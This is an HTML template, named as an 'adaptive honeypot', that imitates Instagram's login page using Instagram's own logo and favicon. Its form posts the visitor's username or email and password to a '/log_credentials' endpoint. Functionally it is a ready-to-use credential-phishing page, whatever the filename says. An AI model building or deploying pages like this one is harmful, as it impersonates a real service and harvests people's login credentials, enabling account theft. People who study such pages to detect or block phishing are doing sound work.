<!-- templates/adaptive_honeypot_instagram.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen">

  <div class="bg-white p-10 rounded-lg shadow-md max-w-sm w-full">
    <div class="flex justify-center mb-6">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" class="w-36">
    </div>

    <form method="POST" action="/log_credentials">
      <input type="hidden" name="source" value="instagram">
      <input type="text" name="email" placeholder="Phone number, username, or email" required class="w-full p-2 mb-4 border rounded bg-gray-100">
      <input type="password" name="password" placeholder="Password" required class="w-full p-2 mb-4 border rounded bg-gray-100">
      <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 rounded">Log In</button>
    </form>

    <div class="text-center text-sm text-gray-500 mt-4">
      Forgot password?
    </div>
  </div>

</body>
</html>
